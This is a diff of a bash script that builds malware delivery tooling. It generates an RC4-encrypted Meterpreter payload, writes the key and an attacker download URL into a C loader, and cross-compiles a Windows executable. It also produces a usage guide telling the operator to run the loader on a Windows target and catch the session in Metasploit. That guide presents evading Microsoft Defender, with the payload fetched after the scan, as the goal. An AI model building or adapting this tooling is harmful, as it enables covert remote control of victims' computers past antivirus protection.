@@ -1,11 +1,11 @@
 #!/bin/bash
-# Automated Staged Loader Setup
+# Automated Stageless Loader Setup
 # Generates payload, encrypts it, compiles loader, and sets up server/listener
 
 set -e
 
 echo "========================================"
-echo "  Staged Loader - Automated Setup"
+echo "  Stageless Loader - Automated Setup"
 echo "========================================"
 echo ""
 
@@ -62,11 +62,11 @@ echo "========================================"
 # Extract RC4 key from payload_keys.h
 RC4_KEY=$(grep "g_Rc4Key\[32\]" payload_keys.h | sed 's/.*= { \(.*\) };/\1/')
 
-# Update staged_loader.c with new key
-sed -i "s/static BYTE g_Rc4Key\[32\] = { .* };/static BYTE g_Rc4Key[32] = { $RC4_KEY };/" staged_loader.c
+# Update stageless_loader.c with new key
+sed -i "s/static BYTE g_Rc4Key\[32\] = { .* };/static BYTE g_Rc4Key[32] = { $RC4_KEY };/" stageless_loader.c
 
 # Update download URL in loader
-sed -i "s|char url\[\] = \".*\";|char url[] = \"http://$LHOST:$HTTP_PORT/payload.enc\";|" staged_loader.c
+sed -i "s|char url\[\] = \".*\";|char url[] = \"http://$LHOST:$HTTP_PORT/payload.enc\";|" stageless_loader.c
 
 echo "[+] Loader source updated with new key and URL"
 
@@ -76,10 +76,10 @@ echo "  Step 4: Compiling Loader"
 echo "========================================"
 
 # Compile loader
-x86_64-w64-mingw32-gcc -O2 -s staged_loader.c -o staged_loader.exe -lurlmon
+x86_64-w64-mingw32-gcc -O2 -s stageless_loader.c -o stageless_loader.exe -lurlmon
 
-LOADER_SIZE=$(stat -c%s staged_loader.exe)
-echo "[+] Loader compiled: staged_loader.exe ($LOADER_SIZE bytes)"
+LOADER_SIZE=$(stat -c%s stageless_loader.exe)
+echo "[+] Loader compiled: stageless_loader.exe ($LOADER_SIZE bytes)"
 
 echo ""
 echo "========================================"
@@ -134,7 +134,7 @@ echo "========================================"
 
 # Create usage instructions
 cat > USAGE.md << EOF
-# Staged Loader - Usage Guide
+# Stageless Loader - Usage Guide
 
 ## ✅ Setup Complete!
 
@@ -173,7 +173,7 @@ Your staged loader system is ready to use.
 
 ### Step 3: Run on Windows Target
 
-1. Copy \`staged_loader.exe\` to Windows machine
+1. Copy \`stageless_loader.exe\` to Windows machine
 2. Run it
 3. Watch Metasploit console for:
    \`\`\`
@@ -203,7 +203,7 @@ Follow the prompts to create a new loader with different configuration.
 ## 📁 Files
 
 \`\`\`
-staged_loader.exe    <- Clean loader (NO MSFVenom inside!)
+stageless_loader.exe    <- Clean loader (NO MSFVenom inside!)
 payload.enc          <- RC4-encrypted Meterpreter ($PAYLOAD_SIZE bytes)
 start_server.sh      <- HTTP server script
 start_listener.sh    <- Metasploit handler script
@@ -217,7 +217,7 @@ start_listener.sh    <- Metasploit handler script
 - ❌ MSFVenom embedded in binary
 - ❌ Defender detects instantly
 
-**Staged Loader:**
+**Stageless Loader:**
 - ✅ NO MSFVenom in binary
 - ✅ Defender scans → finds nothing
 - ✅ Payload downloaded AFTER scan
@@ -247,7 +247,7 @@ echo "  ✅ SETUP COMPLETE!"
 echo "========================================"
 echo ""
 echo "Generated files:"
-echo "  - staged_loader.exe ($LOADER_SIZE bytes)"
+echo "  - stageless_loader.exe ($LOADER_SIZE bytes)"
 echo "  - payload.enc ($PAYLOAD_SIZE bytes)"
 echo "  - start_server.sh"
 echo "  - start_listener.sh"
@@ -256,7 +256,7 @@ echo ""
 echo "Next steps:"
 echo "  1. ./start_server.sh    (in this terminal)"
 echo "  2. ./start_listener.sh  (in new terminal)"
-echo "  3. Run staged_loader.exe on Windows target"
+echo "  3. Run stageless_loader.exe on Windows target"
 echo ""
 echo "For detailed instructions, see: USAGE.md"
 echo ""
